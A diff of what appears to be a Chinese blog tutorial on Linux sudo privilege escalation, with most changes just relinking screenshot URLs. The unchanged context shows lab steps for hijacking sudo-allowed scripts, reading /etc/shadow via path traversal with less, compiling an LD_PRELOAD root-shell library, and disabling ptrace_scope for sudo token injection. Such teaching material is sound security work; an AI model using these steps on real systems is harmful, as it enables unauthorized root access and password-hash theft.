@@ -2,6 +2,7 @@
 title: "sudo相关提权思路"
 date: 2025-12-11T00:00:00+08:00
 draft: false
+
 ---
 
 # sudo相关提权思路
@@ -85,16 +86,17 @@ sudo的基本利用思路有如下几种：
 sudo -l
 ~~~
 
-![image-20240716220724865](https://img2023.cnblogs.com/blog/3450279/202407/3450279-20240716220724786-2078888943.png)
+![image-20240716220724865](https://yuy0ung.oss-cn-chengdu.aliyuncs.com/3450279-20240716220724786-2078888943.png)
 
 我们发现`/home/yuy0ung/demo/shell.sh`可以免密执行sudo
 
 再查看该脚本所在目录的权限：
+
 ~~~shell
 ls -al /home/yuy0ung/demo/
 ~~~
 
-![image-20240716221531332](https://img2023.cnblogs.com/blog/3450279/202407/3450279-20240716221531441-19375503.png)
+![image-20240716221531332](https://yuy0ung.oss-cn-chengdu.aliyuncs.com/3450279-20240716221531441-19375503.png)
 
 我们拥有该文件夹的所有权限，则可以向`/home/yuy0ung/demo/shell.sh`中夹带点私货：
 
@@ -112,7 +114,7 @@ ls -al /home/yuy0ung/demo/shell.sh
 chmod +x /home/yuy0ung/demo/shell.sh
 ~~~
 
-![image-20240716222430692](https://img2023.cnblogs.com/blog/3450279/202407/3450279-20240716222430625-819980486.png)
+![image-20240716222430692](https://yuy0ung.oss-cn-chengdu.aliyuncs.com/3450279-20240716222430625-819980486.png)
 
 没有问题了，免密sudo执行脚本：
 
@@ -120,7 +122,7 @@ chmod +x /home/yuy0ung/demo/shell.sh
 sudo /home/yuy0ung/demo/shell.sh
 ~~~
 
-<img src="https://img2023.cnblogs.com/blog/3450279/202407/3450279-20240716222716824-242402172.png" alt="image-20240716222717259" style="zoom:150%;" />
+<img src="https://yuy0ung.oss-cn-chengdu.aliyuncs.com/3450279-20240716222716824-242402172.png" alt="image-20240716222717259" style="zoom:150%;" />
 
 提权成功
 
@@ -155,7 +157,7 @@ chmod 755 /var/www/log.sh
   sudo -l
   ~~~
 
-  ![image-20240718002023828](https://img2023.cnblogs.com/blog/3450279/202407/3450279-20240718002024652-1975367287.png)
+  ![image-20240718002023828](https://yuy0ung.oss-cn-chengdu.aliyuncs.com/3450279-20240718002024652-1975367287.png)
 
   我们发现`/var/www/log.sh`具有免密sudo权限
 
@@ -175,7 +177,7 @@ chmod 755 /var/www/log.sh
   cat /var/www/log.sh
   ~~~
 
-  ![image-20240718003739915](https://img2023.cnblogs.com/blog/3450279/202407/3450279-20240718003740167-2098692339.png)
+  ![image-20240718003739915](https://yuy0ung.oss-cn-chengdu.aliyuncs.com/3450279-20240718003740167-2098692339.png)
 
   可见脚本内容为：
 
@@ -194,7 +196,7 @@ chmod 755 /var/www/log.sh
   echo "/bin/bash" > /tmp/log.sh
   ~~~
 
-  ![image-20240718005235854](https://img2023.cnblogs.com/blog/3450279/202407/3450279-20240718005236406-1421944661.png)
+  ![image-20240718005235854](https://yuy0ung.oss-cn-chengdu.aliyuncs.com/3450279-20240718005236406-1421944661.png)
 
 * 赋予该脚本文件所有权限：
 
@@ -202,7 +204,7 @@ chmod 755 /var/www/log.sh
   chmod 777 /tmp/log.sh
   ~~~
 
-  ![image-20240718005517757](https://img2023.cnblogs.com/blog/3450279/202407/3450279-20240718005518195-1270521358.png)
+  ![image-20240718005517757](https://yuy0ung.oss-cn-chengdu.aliyuncs.com/3450279-20240718005518195-1270521358.png)
 
 * sudo运行`/var/www/log.sh`，间接运行`/tmp/log.sh`：
 
@@ -210,7 +212,7 @@ chmod 755 /var/www/log.sh
   sudo /var/www/log.sh "/tmp"
   ~~~
 
-  ![image-20240718005903224](https://img2023.cnblogs.com/blog/3450279/202407/3450279-20240718005903656-1415968090.png)
+  ![image-20240718005903224](https://yuy0ung.oss-cn-chengdu.aliyuncs.com/3450279-20240718005903656-1415968090.png)
 
   成功实现权限提升
 
@@ -234,7 +236,7 @@ chmod 755 /var/www/log.sh
   # 利用脚本免密切换至root
   ~~~
 
-  ![image-20240718014925077](https://img2023.cnblogs.com/blog/3450279/202407/3450279-20240718014925605-189238632.png)
+  ![image-20240718014925077](https://yuy0ung.oss-cn-chengdu.aliyuncs.com/3450279-20240718014925605-189238632.png)
 
 * 脚本2：
 
@@ -255,7 +257,7 @@ chmod 755 /var/www/log.sh
   # 利用脚本读取shadow文件
   ~~~
 
-  ![image-20240718012317919](https://img2023.cnblogs.com/blog/3450279/202407/3450279-20240718012318486-1614597211.png)
+  ![image-20240718012317919](https://yuy0ung.oss-cn-chengdu.aliyuncs.com/3450279-20240718012318486-1614597211.png)
 
 脚本的利用方式是多样的，这里仅供参考
 
@@ -276,11 +278,11 @@ sudo less /home/yuy0ung/../../etc/shadow
 
 如此，可以免密sudo用less查看`/etc/shadow`：
 
-![image-20240718213543554](https://img2023.cnblogs.com/blog/3450279/202407/3450279-20240718213543285-1744060463.png)
+![image-20240718213543554](https://yuy0ung.oss-cn-chengdu.aliyuncs.com/3450279-20240718213543285-1744060463.png)
 
 成功查看：
 
-![image-20240718213443775](https://img2023.cnblogs.com/blog/3450279/202407/3450279-20240718213443717-680993685.png)
+![image-20240718213443775](https://yuy0ung.oss-cn-chengdu.aliyuncs.com/3450279-20240718213443717-680993685.png)
 
 ### 五、sudo LD_PRELOAD环境变量提权
 
@@ -319,11 +321,11 @@ LD_PRELOAD预加载是一个环境变量，主要用来设置共享对象文件�
 
 * 首先以root身份在/etc/sudoer中添加`env_keep+=LD_PRELOAD`：
 
-![image-20240727161108083](https://img2023.cnblogs.com/blog/3450279/202407/3450279-20240727161108686-1160307734.png)
+![image-20240727161108083](https://yuy0ung.oss-cn-chengdu.aliyuncs.com/3450279-20240727161108686-1160307734.png)
 
 * 再添加一个sudo配置，我这里添加的是apache2：
 
-  ![image-20240727162219205](https://img2023.cnblogs.com/blog/3450279/202407/3450279-20240727162220436-540612903.png)
+  ![image-20240727162219205](https://yuy0ung.oss-cn-chengdu.aliyuncs.com/3450279-20240727162220436-540612903.png)
 
   ok切换到普通用户yuy0ung准备复现
 
@@ -331,7 +333,7 @@ LD_PRELOAD预加载是一个环境变量，主要用来设置共享对象文件�
 
 * 查看sudo配置：
 
-  ![image-20240727162513390](https://img2023.cnblogs.com/blog/3450279/202407/3450279-20240727162514308-592075090.png)
+  ![image-20240727162513390](https://yuy0ung.oss-cn-chengdu.aliyuncs.com/3450279-20240727162514308-592075090.png)
 
   apache2可以免密sudo，这里其实可以利用apache2显示`/etc/shadow`的内容再进行密码爆破，但注意到 `env_keep+=LD_PRELOAD`，即保留当前LD_PRELOAD环境变量，那么就有个更好的思路：**可以通过创建一个以root权限启动BashShell 为内容的共享库，在使用sudo命令启动 apache2 服务时加载此共享库来进行提权**
 
@@ -348,7 +350,7 @@ LD_PRELOAD预加载是一个环境变量，主要用来设置共享对象文件�
   }
   ~~~
 
-  ![image-20240727163340902](https://img2023.cnblogs.com/blog/3450279/202407/3450279-20240727163342140-169531631.png)
+  ![image-20240727163340902](https://yuy0ung.oss-cn-chengdu.aliyuncs.com/3450279-20240727163342140-169531631.png)
 
 * gcc编译为shell.so，且不使用默认的启动文件:
 
@@ -356,7 +358,7 @@ LD_PRELOAD预加载是一个环境变量，主要用来设置共享对象文件�
   gcc -shared -fPIC -o shell.so shell.c -nostartfiles
   ~~~
 
-  ![image-20240727173922774](https://img2023.cnblogs.com/blog/3450279/202407/3450279-20240727173923365-1575294673.png)
+  ![image-20240727173922774](https://yuy0ung.oss-cn-chengdu.aliyuncs.com/3450279-20240727173923365-1575294673.png)
 
 * 执行命令启动apache2并加载LD_PRELOAD中的自定义库：
 
@@ -364,7 +366,7 @@ LD_PRELOAD预加载是一个环境变量，主要用来设置共享对象文件�
   sudo LD_PRELOAD=/tmp/shell.so apache2
   ~~~
 
-  <img src="https://img2023.cnblogs.com/blog/3450279/202407/3450279-20240727173941063-1017736037.png" alt="image-20240727173940655" style="zoom:150%;" />
+  <img src="https://yuy0ung.oss-cn-chengdu.aliyuncs.com/3450279-20240727173941063-1017736037.png" alt="image-20240727173940655" style="zoom:150%;" />
 
   成功提权
 
@@ -409,7 +411,7 @@ echo 0 > /proc/sys/kernel/yama/ptrace_scope
 # 这个设置在重启之后会自动失效
 ~~~
 
-<img src="https://img2023.cnblogs.com/blog/3450279/202407/3450279-20240728025027995-2142195635.png" alt="image-20240728025027395" style="zoom:150%;" />
+<img src="https://yuy0ung.oss-cn-chengdu.aliyuncs.com/3450279-20240728025027995-2142195635.png" alt="image-20240728025027395" style="zoom:150%;" />
 
 切换到普通用户yuy0ung完成配置
 
@@ -417,11 +419,11 @@ echo 0 > /proc/sys/kernel/yama/ptrace_scope
 
 * 为了方便实验，我直接将脚本全部下载至/tmp目录了：
 
-![image-20240728025254396](https://img2023.cnblogs.com/blog/3450279/202407/3450279-20240728025254682-1101514922.png)
+![image-20240728025254396](https://yuy0ung.oss-cn-chengdu.aliyuncs.com/3450279-20240728025254682-1101514922.png)
 
 * 全部赋予权限：
 
-<img src="https://img2023.cnblogs.com/blog/3450279/202407/3450279-20240728030146193-118866214.png" alt="image-20240728030145943" style="zoom:150%;" />
+<img src="https://yuy0ung.oss-cn-chengdu.aliyuncs.com/3450279-20240728030146193-118866214.png" alt="image-20240728030145943" style="zoom:150%;" />
 
 * 开始利用
 
@@ -461,12 +463,12 @@ echo 0 > /proc/sys/kernel/yama/ptrace_scope
 
 * 这里需要**另起一个终端sudo**执行一下命令并输入密码，这也是利用的条件之一：
 
-  ![image-20240728030005612](https://img2023.cnblogs.com/blog/3450279/202407/3450279-20240728030006157-1384522601.png)
+  ![image-20240728030005612](https://yuy0ung.oss-cn-chengdu.aliyuncs.com/3450279-20240728030006157-1384522601.png)
 
 * 接下来执行脚本文件进行利用：
 
   在脚本完成注入后执行`sudo -i`即可完成提权
-  ![image-20240728030406709](https://img2023.cnblogs.com/blog/3450279/202407/3450279-20240728030407021-1364430602.png)
+  ![image-20240728030406709](https://yuy0ung.oss-cn-chengdu.aliyuncs.com/3450279-20240728030407021-1364430602.png)
 
   成功获得root权限
 
